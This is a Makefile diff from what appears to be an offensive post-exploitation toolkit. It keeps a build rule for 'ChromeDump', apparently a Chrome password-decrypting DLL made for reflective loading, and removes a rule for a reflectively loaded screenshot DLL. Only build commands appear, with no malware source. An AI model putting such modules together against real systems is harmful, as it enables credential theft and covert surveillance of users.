@@ -29,7 +29,3 @@ elevate:
 ChromeDump:
 	$(COMPILER) ChromePassDecryptor.c ReflectiveLoader.c sqlite/sqlite3.c -c -m32
 	$(COMPILER) ChromePassDecryptor.c ReflectiveLoader.o sqlite3.o -o ChromeDump.dll -shared -m32 -static -lcrypt32
-
-screenshot:
-	$(CPCOMPILER) screenshot.cpp ReflectiveLoader.c -c -m32
-	$(CPCOMPILER) screenshot.cpp ReflectiveLoader.o -o screenshot.dll -shared -m32 -static --lgdiplus
